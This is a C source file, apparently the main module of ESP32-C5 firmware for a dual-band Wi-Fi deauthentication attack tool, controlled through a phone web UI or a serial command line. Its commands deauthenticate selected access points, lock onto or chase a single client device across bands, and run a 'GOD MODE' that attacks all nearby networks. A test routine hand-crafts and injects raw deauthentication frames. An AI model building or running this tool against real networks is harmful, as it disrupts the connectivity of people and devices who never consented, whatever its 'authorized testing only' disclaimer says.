/*
 * ESP32-C5 Dual-Band Deauther — entry point.
 *
 * Control from your phone: connect to Wi-Fi "Deauther-C5" (pass "deauther123"),
 * open http://192.168.4.1/. A serial CLI on UART0 is also available for debug.
 *
 * Single radio: scanning/deauthing briefly drops the AP — that is physics, not
 * a bug (simultaneous AP + attack needs two chips).
 *
 * Authorized security testing only — deauth disrupts every client of the
 * targeted AP. Only use it on networks you own or are permitted to test.
 */
#include <stdlib.h>
#include "esp_console.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_system.h"

#include "wifi_controller.h"
#include "control.h"
#include "deauth_engine.h"
#include "http_server.h"
#include "led.h"

static const char *TAG = "DEAUTHER";

// ---- serial CLI (thin wrappers over the shared control surface) -------------
static int cmd_scan(int c, char **v){ (void)c;(void)v; printf("found %d. use 'list'\n", control_scan()); return 0; }
static int cmd_list(int c, char **v){ (void)c;(void)v; static char j[8192]; control_list_json(j,sizeof(j)); printf("%s\n", j); return 0; }
static int cmd_god (int c, char **v){ (void)c;(void)v; control_god();  printf("GOD MODE on\n"); return 0; }
static int cmd_protect(int c, char **v){
    if (c < 2){ printf("usage: protect <index> [index ...]  (toggles God-Mode SAFE)\n"); return 1; }
    int idx[48], n = 0;
    for (int i = 1; i < c && n < 48; i++) idx[n++] = atoi(v[i]);
    control_protect(idx, n);
    printf("toggled protect on %d network(s)\n", n);
    return 0;
}
static int cmd_stop(int c, char **v){ (void)c;(void)v; control_stop(); printf("stopped\n"); return 0; }
static int cmd_deauth(int c, char **v){
    if (c < 2){ printf("usage: deauth <index> [index ...]\n"); return 1; }
    int idx[16], n = 0;
    for (int i = 1; i < c && n < 16; i++) idx[n++] = atoi(v[i]);
    int got = control_attack_selection(idx, n);
    printf(got > 0 ? "attacking %d AP(s)\n" : "bad index\n", got);
    return 0;
}
static int cmd_dev(int c, char **v){ (void)c;(void)v; printf("%d devices\n", control_count_clients()); return 0; }
static int parse_mac6(const char *s, uint8_t out[6]){
    return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}
static int cmd_strike(int c, char **v){
    if (c < 5){ printf("usage: strike <ch> <is5:0|1> <bssid> <client-mac>\n"); return 1; }
    uint8_t bssid[6], mac[6];
    if (!parse_mac6(v[3], bssid) || !parse_mac6(v[4], mac)){ printf("bad mac\n"); return 1; }
    control_strike((uint8_t)atoi(v[1]), atoi(v[2]), bssid, mac);
    printf("striking %s via %s on ch%s\n", v[4], v[3], v[1]);
    return 0;
}
// hunt <mac> <ch> <is5> <bssid> [<ch> <is5> <bssid> ...]  — chase 1 client across bands
static int cmd_hunt(int c, char **v){
    if (c < 5 || (c - 2) % 3 != 0){
        printf("usage: hunt <client-mac> <ch> <is5> <bssid> [<ch> <is5> <bssid> ...]\n"); return 1;
    }
    uint8_t mac[6];
    if (!parse_mac6(v[1], mac)){ printf("bad client mac\n"); return 1; }
    uint8_t bssids[4][6], chans[4]; int is5[4];
    int n = 0;
    for (int i = 2; i + 2 < c && n < 4; i += 3){
        chans[n] = (uint8_t)atoi(v[i]);
        is5[n]   = atoi(v[i+1]);
        if (!parse_mac6(v[i+2], bssids[n])){ printf("bad bssid\n"); return 1; }
        n++;
    }
    control_hunt(mac, bssids, chans, is5, n);
    printf("hunting %s across %d band(s)\n", v[1], n);
    return 0;
}
static int cmd_heap(int c, char **v){ (void)c;(void)v;
    printf("free heap = %lu bytes, min ever = %lu bytes\n",
           (unsigned long)esp_get_free_heap_size(),
           (unsigned long)esp_get_minimum_free_heap_size());
    return 0;
}
// Injection matrix test: find which method actually transmits on this C5.
// Frame targets a made-up BSSID (belongs to nobody) so it harms no network.
static int tx_n(wifi_interface_t ifx, bool seq, int n){
    static uint8_t fr[26] = {0xC0,0x00,0x00,0x00,
        0xff,0xff,0xff,0xff,0xff,0xff, 0x02,0,0,0,0,0x01,
        0x02,0,0,0,0,0x01, 0x00,0x00, 0x07,0x00};
    int ok = 0; esp_err_t last = ESP_OK;
    for (int i = 0; i < n; i++){ esp_err_t e = esp_wifi_80211_tx(ifx, fr, sizeof(fr), seq); if (e==ESP_OK) ok++; else last=e; }
    if (ok < n) printf("   (err %s)\n", esp_err_to_name(last));
    return ok;
}
extern int esp_wifi_internal_tx(wifi_interface_t ifx, void *buf, uint16_t len);
static int cmd_txtest(int c, char **v){
    (void)c;(void)v;
    static uint8_t fr[26] = {0xC0,0x00,0x00,0x00,
        0xff,0xff,0xff,0xff,0xff,0xff, 0x02,0,0,0,0,0x01,
        0x02,0,0,0,0,0x01, 0x00,0x00, 0x07,0x00};
    esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    uint8_t ch; wifi_second_chan_t sec; esp_wifi_get_channel(&ch,&sec);
    printf("=== txtest on ch %u ===\n", ch);
    printf("A AP  seq=1 : %d/100\n", tx_n(WIFI_IF_AP, true, 100));
    esp_wifi_set_promiscuous(true);
    printf("C AP  promisc : %d/100\n", tx_n(WIFI_IF_AP, false, 100));
    int okE = 0; for (int i=0;i<100;i++) if (esp_wifi_internal_tx(WIFI_IF_AP, fr, sizeof(fr))==0) okE++;
    printf("E internal_tx : %d/100\n", okE);
    esp_wifi_set_promiscuous(false);
    wifi_restore_ap_channel();
    return 0;
}

static void start_cli(void)
{
    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t rc = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    rc.prompt = "deauther>";
    esp_console_dev_uart_config_t uc = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&uc, &rc, &repl));
    esp_console_register_help_command();
    const esp_console_cmd_t cmds[] = {
        { "scan",   "Scan 2.4 + 5 GHz",              NULL, &cmd_scan,   NULL },
        { "list",   "List scanned networks",         NULL, &cmd_list,   NULL },
        { "dev",    "Count devices per AP",          NULL, &cmd_dev,    NULL },
        { "heap",   "Show free/min heap",            NULL, &cmd_heap,   NULL },
        { "txtest", "Injection self-test (safe)",    NULL, &cmd_txtest, NULL },
        { "deauth", "deauth <i> [i...]: attack APs", NULL, &cmd_deauth, NULL },
        { "strike", "strike <ch> <is5> <bssid> <mac>: lock 1 client", NULL, &cmd_strike, NULL },
        { "hunt",   "hunt <mac> <ch> <is5> <bssid> [...]: dual-band chase", NULL, &cmd_hunt, NULL },
        { "god",    "GOD MODE: attack all",          NULL, &cmd_god,    NULL },
        { "protect","protect <i...>: toggle SAFE (God skips)", NULL, &cmd_protect, NULL },
        { "stop",   "Stop attacking",                NULL, &cmd_stop,   NULL },
    };
    for (size_t i = 0; i < sizeof(cmds)/sizeof(cmds[0]); i++)
        ESP_ERROR_CHECK(esp_console_cmd_register(&cmds[i]));
    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}

void app_main(void)
{
    esp_log_level_set("wifi", ESP_LOG_ERROR);   // quiet the band-switch / tx-op-fail spam
    ESP_LOGI(TAG, "ESP32-C5 Dual-Band Deauther starting");
    wifi_system_init();      // AP + dual-band STA
    control_init();          // attack task
    led_init();              // status LED
    http_server_start();     // web UI at http://192.168.4.1/
    start_cli();             // serial CLI (debug)
    ESP_LOGI(TAG, "Ready — join Wi-Fi '%s', open http://192.168.4.1/", WIFI_AP_SSID);
}
